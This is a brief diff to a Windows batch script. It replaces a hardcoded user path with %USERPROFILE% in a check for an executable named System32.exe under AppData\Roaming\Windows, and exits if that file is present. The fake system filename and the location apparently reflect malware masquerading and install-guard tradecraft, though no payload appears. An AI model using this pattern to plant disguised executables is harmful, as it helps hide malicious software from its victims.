@@ -1,5 +1,5 @@
 @echo off
-set FILE="C:\Users\GLICHED\AppData\Roaming\Windows\System32.exe"
+set FILE="%USERPROFILE%\AppData\Roaming\Windows\System32.exe"
 if exist %FILE% (
     exit /b
 )
